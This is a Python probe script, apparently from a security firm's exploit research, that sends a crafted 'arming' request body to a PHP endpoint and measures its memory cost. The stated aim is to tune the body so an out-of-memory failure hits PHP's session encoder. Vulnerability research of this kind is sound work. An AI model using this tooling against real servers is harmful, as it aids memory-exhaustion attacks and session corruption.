#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""a1_probe.py - what does the exact arming body cost, measured just before it kills the request?

Searching for an arming shape by "did it OOM" is a binary signal: a body either ends the request or it
does not, and the interesting question is how far from the ceiling it was. This drives the *same* body
that `a1_arm.py` sends (it imports the builder, so the shapes cannot drift apart) at `probe.php`, which
reports the bytes PHP actually allocated at script entry plus the parsed structure.

Use it to map parts -> bytes for a build, then compute the body that leaves less than one page of
headroom - that is the only way an allocation failure can land on the session encoder instead of on the
parser or on a chunk.

usage:
  a1_probe.py --url http://127.0.0.1:18123/probe.php --parts 3000
  a1_probe.py --url ... --parts 3000 --json
"""
import argparse
import json
import socket
import sys

import a1_arm

LIMIT = 128 * 1024 * 1024


def dechunk(payload: bytes) -> bytes:
    """nginx+FPM replies with chunked framing; apache+mod_php sends a length. Accept both."""
    out = bytearray()
    while True:
        line, _, rest = payload.partition(b"\r\n")
        try:
            size = int(line.split(b";")[0].strip() or b"0", 16)
        except ValueError:
            return payload
        if size == 0:
            return bytes(out)
        out += rest[:size]
        payload = rest[size + 2:]


def main() -> int:
    ap = argparse.ArgumentParser(description="memory cost of the arming body, measured on the target")
    ap.add_argument("--url", default="http://127.0.0.1:18120/probe.php")
    ap.add_argument("--sid-hex", default="00")
    ap.add_argument("--parts", type=int, default=860)
    ap.add_argument("--depth", type=int, default=64)
    ap.add_argument("--key-pad", type=int, default=90)
    ap.add_argument("--fillers", type=int, default=14)
    ap.add_argument("--big", type=int, default=78)
    ap.add_argument("--big-len", type=int, default=8000)
    ap.add_argument("--burners", type=int, default=20)
    ap.add_argument("--burner-len", type=int, default=4000)
    ap.add_argument("--progress-len", type=int, default=4000)
    ap.add_argument("--progress-first", action="store_true")
    ap.add_argument("--query-n", type=int, default=0,
                    help="8-char query parameters with --query-len bytes of filler each")
    ap.add_argument("--query-len", type=int, default=1000)
    ap.add_argument("--chunked", action="store_true", default=True,
                    help="send chunked, as the arming does (kept for symmetry with a1_arm)")
    ap.add_argument("--timeout", type=float, default=300.0)
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    body = a1_arm.build(args.parts, args.depth, args.key_pad, args.fillers, args.big,
                        args.big_len, args.burners, args.burner_len, args.progress_len,
                        args.sid_hex, progress_first=args.progress_first)
    hostport = args.url.split("://", 1)[-1]
    hostport, _, path = hostport.partition("/")
    host, _, port = hostport.partition(":")
    path = "/" + path
    if args.query_n:
        params = "&".join("q%07d=%s" % (i, "Q" * args.query_len) for i in range(args.query_n))
        path += ("&" if "?" in path else "?") + params
    raw, err = a1_arm.send_chunked(host, int(port or 80), path, body, args.timeout)
    text = raw.decode("latin1", "replace")
    head, _, payload = text.partition("\r\n\r\n")
    status = head.splitlines()[0] if head else "(no response)"
    if "transfer-encoding: chunked" in head.lower():
        payload = dechunk(payload.encode("latin1")).decode("latin1", "replace")

    if (err or "").startswith("no target on"):
        print(err, file=sys.stderr)
        return 3
    if err or not payload.strip():
        print("body=%d B  %s  -> request died before the script ran (%s)"
              % (len(body), status, err or "no body"), file=sys.stderr)
        print("  that is the ceiling: nothing above this shape can be measured, only bisected",
              file=sys.stderr)
        return 1
    try:
        data = json.loads(payload)
    except ValueError:
        print("body=%d B  %s  -> response is not probe.php JSON" % (len(body), status),
              file=sys.stderr)
        return 2

    usage = data.get("memory_usage", 0)
    result = {
        "parts": args.parts,
        "body_bytes": len(body),
        "post_nodes": data.get("post_nodes"),
        "post_depth": data.get("post_depth"),
        "memory_usage": usage,
        "memory_peak": data.get("memory_peak"),
        "headroom": LIMIT - usage,
        "headroom_pages": (LIMIT - usage) // 4096,
        "limit": data.get("memory_limit"),
    }
    if args.json:
        print(json.dumps(result, indent=2))
        return 0
    print("parts=%-5d nodes=%-7s usage=%6.1f MiB  peak=%s  headroom=%6.1f MiB (%d pages of 4096)"
          % (args.parts, result["post_nodes"], usage / 1048576.0, result["memory_peak"],
             result["headroom"] / 1048576.0, result["headroom_pages"]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
